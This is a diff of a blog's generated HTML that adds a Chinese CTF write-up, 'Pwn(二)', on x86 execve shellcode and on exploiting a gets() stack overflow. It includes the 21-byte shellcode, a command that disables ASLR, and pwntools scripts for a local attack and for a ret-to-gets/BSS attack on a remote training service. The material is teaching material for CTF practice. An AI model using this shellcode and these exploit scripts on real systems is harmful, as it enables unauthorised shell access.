@@ -6,18 +6,27 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Tag: Pwn | ckf&#39;s blog</title>
+  <title>Pwn(二) | ckf&#39;s blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="yep">
-<meta property="og:type" content="website">
-<meta property="og:title" content="ckf&#39;s blog">
-<meta property="og:url" content="http://yoursite.com/tags/Pwn/index.html">
+  <meta name="description" content="简介：集训Day12，shellcode了解一下">
+<meta name="keywords" content="ctf,Pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Pwn(二)">
+<meta property="og:url" content="http://yoursite.com/2018/07/11/Pwn-二/index.html">
 <meta property="og:site_name" content="ckf&#39;s blog">
-<meta property="og:description" content="yep">
+<meta property="og:description" content="简介：集训Day12，shellcode了解一下">
 <meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://ww4.sinaimg.cn/large/005Z7H2Agy1ft65p4gavnj31hc0u07wh.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/005Z7H2Agy1ft65qk1y0ej31hc0u07wh.jpg">
+<meta property="og:image" content="http://ww3.sinaimg.cn/large/005Z7H2Agy1ft6649mt85j31hc0u01kx.jpg">
+<meta property="og:image" content="http://ww2.sinaimg.cn/large/005Z7H2Agy1ft665h1t9hj31hc0u07wh.jpg">
+<meta property="og:image" content="http://ww3.sinaimg.cn/large/005Z7H2Agy1ft66688417j31hc0u07wh.jpg">
+<meta property="og:image" content="http://ww2.sinaimg.cn/large/005Z7H2Agy1ft66knpklrj31hc0u0agb.jpg">
+<meta property="og:updated_time" content="2018-07-11T12:15:26.962Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="ckf&#39;s blog">
-<meta name="twitter:description" content="yep">
+<meta name="twitter:title" content="Pwn(二)">
+<meta name="twitter:description" content="简介：集训Day12，shellcode了解一下">
+<meta name="twitter:image" content="http://ww4.sinaimg.cn/large/005Z7H2Agy1ft65p4gavnj31hc0u07wh.jpg">
   
     <link rel="alternative" href="/atom.xml" title="ckf&#39;s blog" type="application/atom+xml">
   
@@ -155,36 +164,123 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
+            <article id="post-Pwn-二" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
   
+    <h1 class="article-title" itemprop="name">
+      Pwn(二)
+    </h1>
   
-    
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2018" class="archive-year">2018</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/07/11/Pwn-二/" class="archive-article-date">
+
+        
+        <a href="/2018/07/11/Pwn-二/" class="archive-article-date">
   	<time datetime="2018-07-11T10:51:47.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-07-11</time>
 </a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/07/11/Pwn-二/">Pwn(二)</a>
-    </h1>
-  
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>简介：集训Day12，shellcode了解一下<br><a id="more"></a></p>
+<h1 id="Shellcode"><a href="#Shellcode" class="headerlink" title="Shellcode"></a>Shellcode</h1><hr>
+<p>第一次入门pwn时，所给程序中的代码中都包含有system(‘sh’),我们只要使程序能够跑到那个地方，就能很轻松得拿到shell。当然，实际上根本不会有人傻到留着这么明显的漏洞，这时就需要我们自己进行构造，也就是构造shellcode</p>
+<p>Shellcode实际是一段代码（也可以是填充数据），是用来发送到服务器利用特定漏洞的代码，一般可以获取权限</p>
+<h2 id="int-0x80"><a href="#int-0x80" class="headerlink" title="int 0x80"></a>int 0x80</h2><p>构造shellcode肯定需要用到汇编代码，也肯定需要用到int 0x80实现系统调用。</p>
+<p>一般构造shellcode基于的是11号调用 execve(“/bin/sh”,0,0)</p>
+<p>要求：</p>
+<table>
+<thead>
+<tr>
+<th>Reg</th>
+<th>Vul </th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td> EAX</td>
+<td>11 </td>
+</tr>
+<tr>
+<td> EBX</td>
+<td>addr_of_sh </td>
+</tr>
+<tr>
+<td> ECX</td>
+<td>0 </td>
+</tr>
+<tr>
+<td> EDX</td>
+<td>0 </td>
+</tr>
+</tbody>
+</table>
+<h2 id="source"><a href="#source" class="headerlink" title="source"></a>source</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Section .text</span><br><span class="line">    global _start</span><br><span class="line">_start:</span><br><span class="line">	xor ecx, ecx //异或归零</span><br><span class="line">	mul ecx //这个操作能使其他寄存器也归零</span><br><span class="line">	push ecx</span><br><span class="line">	push 0x68732f2f //入栈字符串</span><br><span class="line">	push 0x6e69622f //入栈字符串</span><br><span class="line">	mov ebx, esp //栈顶就是字符串首地址</span><br><span class="line">	mov al, 0xb //EAX=11</span><br><span class="line">	int 0x80 //实现系统调用</span><br></pre></td></tr></table></figure>
+<p>我们想要构造进的字符串为’/bin/sh’，为7个字节，入栈是4个字节4个字节进入的，因此需要再凑一个毫无用处的字符’/‘，这里需要注意的是坏字符，0x00会截断，还有mov al,0xb操作也是为了防止坏字符</p>
+<h2 id="机器代码"><a href="#机器代码" class="headerlink" title="机器代码"></a>机器代码</h2><p>使用nasm（类似于gcc编译c代码）编译写完的汇编代码，生成一个xxx.o文件</p>
+<p>在终端中输入命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -d xxx.o&gt;dump</span><br></pre></td></tr></table></figure></p>
+<p>将其反汇编后即可得到机器码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shellcode=&quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&quot;</span><br></pre></td></tr></table></figure>
+<p>只有21byte，短小精悍</p>
+<h1 id="7-11-old-friend"><a href="#7-11-old-friend" class="headerlink" title="7-11 old-friend"></a>7-11 old-friend</h1><hr>
+<h2 id="source分析"><a href="#source分析" class="headerlink" title="source分析"></a>source分析</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">void A()</span><br><span class="line">&#123;</span><br><span class="line">	setvbuf(stdout, 0, _IONBF, 0);</span><br><span class="line">	srand(time(0) ^ getpid());</span><br><span class="line">	char buf[100];</span><br><span class="line">	gets(buf);</span><br><span class="line">	int magic = rand();</span><br><span class="line">	if (atoi(buf) == magic) &#123;</span><br><span class="line">		puts(&quot;Okay...&quot;);</span><br><span class="line">		system(&quot;sh&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">int main()&#123;</span><br><span class="line">	A();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>其实和上次（见Pwn（一））其中一题基本一模一样，区别在于gets(buf);和int magic = rand();交换了位置，这样就导致了栈溢出无法覆盖掉magic的值，下面的if()中自带的system(“sh”)也没法得到了，因此需要另想办法。</p>
+<p>运用shellcode方法即可实现</p>
+<h2 id="简单难度"><a href="#简单难度" class="headerlink" title="简单难度"></a>简单难度</h2><p>首先把防火墙关闭，在终端中输入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo sh -c &quot;echo 0 &gt; /proc/sys/kernel/randomize_va_space&quot;</span><br></pre></td></tr></table></figure></p>
+<p>可将ASLR关闭，ASLR是一种针对缓冲区溢出的安全保护技术，通过对堆、栈、共享库映射等线性区布局的随机化，通过增加攻击者预测目的地址的难度，防止攻击者直接定位攻击代码位置，达到阻止溢出攻击的目的的一种技术。</p>
+<p>使用shellcode，首先得将shellcode的机器码写入，这里有个思想，就是数据即是代码。然后通过溢出，改变ret到的地址，返回到shellcode的首地址即可执行我们所构造的代码。</p>
+<p>流程如下：</p>
+<p>写数据-&gt;修改返回值-&gt;执行数据(代码)</p>
+<p>payload=”shellcode机器码”.ljust(offect,”a”)+p32(shellcode的首地址)</p>
+<h3 id="找偏移量"><a href="#找偏移量" class="headerlink" title="找偏移量"></a>找偏移量</h3><p>既然是要覆盖ret，首先得找到偏移量offect</p>
+<p><img src="http://ww4.sinaimg.cn/large/005Z7H2Agy1ft65p4gavnj31hc0u07wh.jpg" alt=""></p>
+<p>很轻松，步骤与Pwn(一)中一样，通过patto+挂掉的地址，求出偏移量 116</p>
+<h3 id="找shellcode首地址"><a href="#找shellcode首地址" class="headerlink" title="找shellcode首地址"></a>找shellcode首地址</h3><p>找shellcode首地址是非常关键的一步，我们先构造一个伪payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">payload=p32(0xdeadbeef)+&quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&quot;.ljust(116,&quot;a&quot;)+p32(0x12345)</span><br><span class="line">p=process(&quot;./7-11&quot;)</span><br><span class="line">raw_input()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive();</span><br></pre></td></tr></table></figure>
+<p>在机器码之前写一个标记p32(0xdeadbeef),0xdeadbeef没有什么特定的意义，换成其他的也行，但最好是八位</p>
+<p>然后raw_input()相当于一个断点，先运行这个py脚本，在进入断点后，会出现一个PID</p>
+<p>PID就是各进程的身份标识,程序一运行系统就会自动分配给进程一个独一无二的PID。进程中止后PID被系统回收，可能会被继续分配给新运行的程序。<br>  PID一列代表了各进程的进程ID,也就是说,PID就是各程的身份标识。</p>
+<p><img src="http://ww1.sinaimg.cn/large/005Z7H2Agy1ft65qk1y0ej31hc0u07wh.jpg" alt=""></p>
+<p>另建一终端，打开gdb，直接attach pid的值，即可进入调试，然后随意在py那个终端中输入一个值使其继续运行。回到gdb终端，使用finish跳过繁杂无用的函数，经过脚本的输入后，使用searchmem 0xdeadbeef命令在内存区中找0xdeadbeef，其地址就是我们所需的shellcode首地址</p>
+<p><img src="http://ww3.sinaimg.cn/large/005Z7H2Agy1ft6649mt85j31hc0u01kx.jpg" alt=""></p>
+<p>修改py脚本，payload正确</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">payload=&quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&quot;.ljust(116,&quot;a&quot;)+p32(0xffffced8)</span><br><span class="line">p=process(&quot;./7-11&quot;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive();</span><br></pre></td></tr></table></figure>
+<p><img src="http://ww2.sinaimg.cn/large/005Z7H2Agy1ft665h1t9hj31hc0u07wh.jpg" alt=""></p>
+<p>shellcode使用成功</p>
+<h2 id="中等难度，打开防火墙"><a href="#中等难度，打开防火墙" class="headerlink" title="中等难度，打开防火墙"></a>中等难度，打开防火墙</h2><p>终端输入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo sh -c &quot;echo 2 &gt; /proc/sys/kernel/randomize_va_space&quot;</span><br></pre></td></tr></table></figure></p>
+<p>前文提到，ALSR防护使栈中的地址每次都是不一样的，我们不能直接使用返回首地址法来使程序执行我们所构造的shellcode</p>
+<p>但通过了解ALSR特性可知，调用的函数地址与BSS段是不会被修改的</p>
+<h3 id="BSS段"><a href="#BSS段" class="headerlink" title="BSS段"></a>BSS段</h3><p>可执行程序包括BSS段、数据段、代码段（也称文本段）。</p>
+<p>BSS（Block Started by Symbol）通常是指用来存放程序中未初始化的全局变量和静态变量的一块内存区域。</p>
+<p>其特点是:</p>
+<ol>
+<li>可读写的</li>
+<li>在程序执行之前BSS段会自动清0。</li>
+</ol>
+<p>所以，未初始的全局变量在程序执行之前已经成0了。</p>
+<p>数据段包括初始化的数据和未初始化的数据（BSS）两部分  。BSS段存放的是未初始化的全局变量和静态变量。</p>
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>通过BSS段和函数地址不变的特点，可以构造payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=&quot;a&quot;*offect+p32(输入函数地址)+p32(bss段首地址)+p32(bss段首地址)</span><br></pre></td></tr></table></figure></p>
+<p>首先输入实现栈溢出攻击，修改ret返回到输入函数gets处即可再进行一次输入.</p>
+<p>我们知道一个函数在调用之前会先push进函数的参数与其返回地址因此第一个bss首地址代表的是gets函数的参数，第二个为其返回值。在第二次输入的时候，我们只要输入shellcode机器码即可完成攻击</p>
+<p>总结： 原理与不开防火墙是相通的，就是写数据-&gt;修改返回值-&gt;执行数据(代码)，但防火墙将栈中地址随机化导致我们不能直接去修改返回值，而是需要利用BSS段地址不会被修改的特性去进行绕过</p>
+<h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p>知道原理后实现起来是非常方便的<br><img src="http://ww3.sinaimg.cn/large/005Z7H2Agy1ft66688417j31hc0u07wh.jpg" alt=""><br>打开gdb调试程序,输入命令vmmap即可找到bss段的地址</p>
+<p><img src="http://ww2.sinaimg.cn/large/005Z7H2Agy1ft66knpklrj31hc0u0agb.jpg" alt=""></p>
+<p>gets函数的地址不能直接在gdb中找，不然会出错。因为涉及到有关动态编译的知识，这里就不多赘述</p>
+<p>payload代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">shellcode=&quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&quot;</span><br><span class="line">payload=&quot;a&quot;*116+p32(0x8048400)+p32(0x0804a100)+p32(0x0804a100)</span><br><span class="line">p=remote(&apos;10.21.13.88&apos;,1025)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">#gdb.attach(p,&apos;&apos;&apos;</span><br><span class="line">#&apos;&apos;&apos;)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive();</span><br></pre></td></tr></table></figure></p>
+<p>p=process()是在本地执行<br>p=remote()即可远程实现运行该代码</p>
+<p>因为有两次的输入，所以有两个p.sendline</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#gdb.attach(p,&apos;&apos;&apos;</span><br><span class="line">#&apos;&apos;&apos;)</span><br></pre></td></tr></table></figure>
+<p>调试代码，可以直接实现python运行后的gdb调试。最终结果肯定是不会用到的，我在此用注释符将其注释掉了</p>
 
-        <div class="article-info info-on-right">
-          
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
@@ -200,61 +296,119 @@
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2018/07/11/Pwn-二/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/07/07/Pwn-一/" class="archive-article-date">
-  	<time datetime="2018-07-07T12:19:17.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-07-07</time>
-</a>
+<nav id="article-nav">
+  
+  
+    <a href="/2018/07/10/web-五/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">web(五)</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/07/07/Pwn-一/">Pwn(一)</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ctf</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Pwn</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
+        
+        
+        <div class="toc-container tooltip-left">
+            <i class="icon-font icon-category"></i>
+            <div class="tooltip tooltip-east">
+                <span class="tooltip-item">
+                </span>
+                <span class="tooltip-content">
+                    <div class="toc-article">
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Shellcode"><span class="toc-number">1.</span> <span class="toc-text">Shellcode</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#int-0x80"><span class="toc-number">1.1.</span> <span class="toc-text">int 0x80</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#source"><span class="toc-number">1.2.</span> <span class="toc-text">source</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#机器代码"><span class="toc-number">1.3.</span> <span class="toc-text">机器代码</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#7-11-old-friend"><span class="toc-number">2.</span> <span class="toc-text">7-11 old-friend</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#source分析"><span class="toc-number">2.1.</span> <span class="toc-text">source分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#简单难度"><span class="toc-number">2.2.</span> <span class="toc-text">简单难度</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#找偏移量"><span class="toc-number">2.2.1.</span> <span class="toc-text">找偏移量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#找shellcode首地址"><span class="toc-number">2.2.2.</span> <span class="toc-text">找shellcode首地址</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#中等难度，打开防火墙"><span class="toc-number">2.3.</span> <span class="toc-text">中等难度，打开防火墙</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#BSS段"><span class="toc-number">2.3.1.</span> <span class="toc-text">BSS段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#原理"><span class="toc-number">2.3.2.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#实现"><span class="toc-number">2.3.3.</span> <span class="toc-text">实现</span></a></li></ol></li></ol></li></ol>
+                    </div>
+                </span>
+            </div>
         </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
+        
+    </div>
+</aside>
+
+
+
   
   
-    </div></section>
   
 
-    
+  
+
+  
+
+  
 
 
           </div>
@@ -277,9 +431,9 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
-		isTag: true,
+		isTag: false,
 		isCategory: false,
 		open_in_new: false,
 		toc_hide_index: true,
